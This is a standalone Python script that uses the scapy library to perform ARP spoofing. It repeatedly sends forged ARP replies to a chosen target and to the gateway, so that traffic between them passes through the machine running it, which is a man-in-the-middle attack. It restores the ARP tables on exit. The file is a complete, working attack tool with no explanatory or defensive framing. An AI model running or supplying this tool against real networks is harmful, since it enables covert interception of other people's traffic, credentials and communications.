#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


class color:
    END     = '\033[0m' 
    WHITE   = '\033[0;30m' 
    RED     = '\033[0;31m' 
    GREEN   = '\033[0;32m' 
    YELLOW  = '\033[0;33m' 
    BLUE    = '\033[0;34m' 
    PURPLE  = '\033[0;35m' 
    OCEAN   = '\033[0;36m' 
    GRAY    = '\033[0;37m' 
    WHITE_BOLD   = '\033[1;30m' 
    RED_BOLD     = '\033[1;31m' 
    GREEN_BOLD   = '\033[1;32m' 
    YELLOW_BOLD  = '\033[1;33m' 
    BLUE_BOLD    = '\033[1;34m' 
    PURPLE_BOLD  = '\033[1;35m' 
    OCEAN_BOLD   = '\033[1;36m' 
    GRAY_BOLD    = '\033[1;37m' 

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway/Router address")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error(color.RED_BOLD + "[-] Please especify a target address, use --help for more info." + color.END)
    elif not options.gateway_ip:
        parser.error(color.RED_BOLD + "[-] Please especify gateway/router IP, use --help for more info." + color.END)
    return options

def get_mac(ip):
    print(color.GREEN_BOLD + "[+] Scanning Network " + color.END + ip)
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()

try:
    packets_sent_count = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        packets_sent_count += 2
        print("\r[+] Sent packets: " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)


